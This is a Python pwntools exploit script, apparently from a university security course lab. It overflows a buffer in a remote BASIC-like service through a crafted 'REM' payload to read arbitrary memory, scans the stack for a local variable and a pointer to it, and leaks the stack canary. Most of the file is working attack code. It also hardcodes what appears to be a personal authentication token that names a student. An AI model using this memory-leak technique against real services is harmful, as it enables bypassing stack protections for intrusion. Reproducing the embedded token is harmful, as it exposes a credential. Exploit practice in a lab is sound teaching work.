#!/usr/bin/env python3
# find_canary_fast.py
# Usage: python3 find_canary_fast.py
#
# Strategy:
# 1) connect and handshake
# 2) scan a limited window under HIGH for an 8-byte qword == 100 (line_no)
# 3) once found, scan nearby memory for a qword equal to that found address (this is locals.line_pointer)
# 4) compute buffer_addr = ptr_addr - 32, canary_addr = buffer_addr + 0x30
# 5) read canary_addr and print hex

from pwn import remote, context, log
import struct
import time

context.log_level = 'info'
HOST = "inf226.puffling.no"
PORT = 7004

TOKEN = b"-b eyJhbGciOiJFZERTQSIsImtpZCI6ImlkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJUaG9tYXMuQmFydGgiLCJpc3MiOiJodHRwczovL2luZjIyNi5wdWZmbGluZy5ubyIsImlhdCI6MTc1OTEzMzcwMCwic2NvcGUiOlsiaWQiXX0.ogTDQS92Ul2wctc2BY-pjcnq8V6uKPo2nhpvDZYLuHfUtQYcAZvbJT00jzV03oJHpVRXm31qMUdvtJ-05733BQ\n"

# Values you provided earlier
# use remote's stack HIGH if known (your /proc/<pid>/maps when you spawn remote)
HIGH = 0x00007ffffffff000
BUFF_TO_LINEPOINT = 128       # keep whatever value you used for the pointer injection

# scanning window - tuned to be small and fast
# We start scanning around HIGH - START_DELTA, down to HIGH - END_DELTA
# ~12KB below HIGH (coarse guess; tuned from your gdb ~9.6KB)
START_DELTA = 0x7000
END_DELTA = 0x8000  # go down to ~32KB below HIGH if needed
STEP = 8               # read qword-aligned words


def p64(x): return struct.pack("<Q", x)
def u64(x): return struct.unpack("<Q", x)[0]


def connect():
    io = remote(HOST, PORT, timeout=4)
    io.recvuntil(b"Please enter your token: ")
    io.sendline(TOKEN)
    # consume until BASIC prompt if present (non-fatal if not)
    try:
        io.recvuntil(b"?", timeout=1)
    except Exception:
        try:
            io.recv(timeout=0.2)
        except Exception:
            pass
    return io


def send_read_at(io, addr):
    """
    Use the REM primitive to make the service print the 8-byte value at absolute addr.
    Returns:
      - integer value if parseable,
      - None on connection failure
    """
    try:
        payload = b"REM" + b"A" * (BUFF_TO_LINEPOINT - 3) + p64(addr)
        io.sendline(payload)
    except Exception:
        return None

    try:
        line = io.recvline(timeout=1).strip()
    except Exception:
        return None

    if not line:
        return None
    # Try parse decimal -> int
    try:
        return int(line)
    except:
        return None


def find_line_no(io, candidates=(100, 110, 120, 130)):
    """
    Scan a focused area for an 8-byte qword that equals any of the line_no candidates.
    Return the address where that qword was found (address of line_no).
    """
    start = HIGH - START_DELTA
    end = HIGH - END_DELTA
    if end < 0:
        end = 0

    log.info(f"Scanning addresses {hex(start)} down to {
             hex(end)} for line_no values {candidates}")
    addr = start
    while addr >= end:
        # ensure connection alive
        try:
            io.send(b"")   # quick test
        except Exception:
            io.close()
            io = connect()

        val = send_read_at(io, addr)
        if val is None:
            # connection died or non-numeric reply; reconnect and continue
            try:
                io.close()
            except:
                pass
            io = connect()
            addr -= STEP
            continue

        if val in candidates:
            log.success(f"Found line_no-like value {val} at {hex(addr)}")
            return io, addr, val

        addr -= STEP

    return None, None, None


def find_ptr_pointing_to(io, target_addr):
    """
    Scan a small neighborhood around the found line_no address for a qword equal to that address.
    This will find locals.line_pointer which stores pointer to line_no.
    Return address where the pointer is stored (ptr_addr_addr).
    """
    # search +/- 0x200 bytes around target address (covering local struct area)
    # but pointer will likely be near the buffer, so search somewhat broadly
    window = 0x400
    start = target_addr + window
    end = target_addr - window
    addr = start
    while addr >= end:
        try:
            val = send_read_at(io, addr)
        except Exception:
            val = None
        if val is None:
            # reconnect if needed
            try:
                io.close()
            except:
                pass
            io = connect()
            addr -= STEP
            continue
        # we expect pointer stored as an address == target_addr
        if val == target_addr:
            log.success(
                f"Found pointer-to-line_no at {hex(addr)} (value == {hex(val)})")
            return io, addr
        addr -= STEP
    return None, None


if __name__ == "__main__":
    io = connect()

    io, line_addr, line_val = find_line_no(io)
    if not line_addr:
        log.failure(
            "Could not find line_no in searched window. Expand START_DELTA/END_DELTA.")
        exit(1)

    # Now find where locals.line_pointer is stored (word containing the address line_addr)
    io, ptr_loc = find_ptr_pointing_to(io, line_addr)
    if not ptr_loc:
        log.failure(
            "Could not find pointer-to-line_no in small neighborhood. Try expanding search range.")
        exit(1)

    # buffer is 32 bytes before pointer in the struct
    buffer_addr = ptr_loc - 32
    canary_addr = buffer_addr + 0x30  # from gdb-derived layout

    log.info(f"Computed buffer_addr = {hex(buffer_addr)}")
    log.info(f"Computed canary_addr = {hex(canary_addr)}")

    # read and show canary
    canary_val = send_read_at(io, canary_addr)
    if canary_val is None:
        log.failure(
            "Failed to read canary at computed address (connection issue).")
    else:
        canary_bytes = canary_val.to_bytes(8, 'little')
        log.success(f"Leaked canary (hex): {
                    canary_bytes.hex()} at {hex(canary_addr)}")

    io.close()
